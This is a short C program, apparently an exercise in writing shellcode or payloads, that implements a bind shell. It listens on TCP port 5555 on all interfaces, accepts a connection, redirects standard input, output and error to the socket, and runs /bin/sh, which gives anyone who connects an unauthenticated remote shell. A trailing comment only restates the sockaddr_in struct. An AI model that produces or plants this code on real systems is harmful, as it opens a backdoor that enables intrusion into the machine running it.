#include <stdio.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <stdlib.h>
#include <unistd.h>

#define herror(msg)\
  do{perror(msg);exit(EXIT_FAILURE);}while(0)

int main(){

  struct sockaddr_in server_addr;
  server_addr.sin_family = AF_INET;
  server_addr.sin_addr.s_addr = INADDR_ANY;
  server_addr.sin_port = htons(5555);

  int sockfd = socket(AF_INET, SOCK_STREAM, 0);
  if(sockfd == -1)
    herror("Error creating sockfd.\n");

  if((bind(sockfd, (struct sockaddr *)&server_addr, sizeof(server_addr)) == -1))
    herror("Could not bind to sockfd.\n");

  if(listen(sockfd, 0) == -1)
    herror("Failed listen.\n");

  int afd = accept(sockfd, NULL, NULL);
    if(afd == -1)
      herror("Error trying to create new socket on accept.\n");

  for(int i=0;i<3;i++)
    dup2(afd, i);
  
  execve("/bin/sh", NULL, NULL);

  return 0;
}

/* struct sockaddr_in {
        short int          sin_family;  // Address family, AF_INET
        unsigned short int sin_port;    // Port number
        struct in_addr     sin_addr;    // Internet address
        unsigned char      sin_zero[8]; // Same size as struct sockaddr
    };
*/
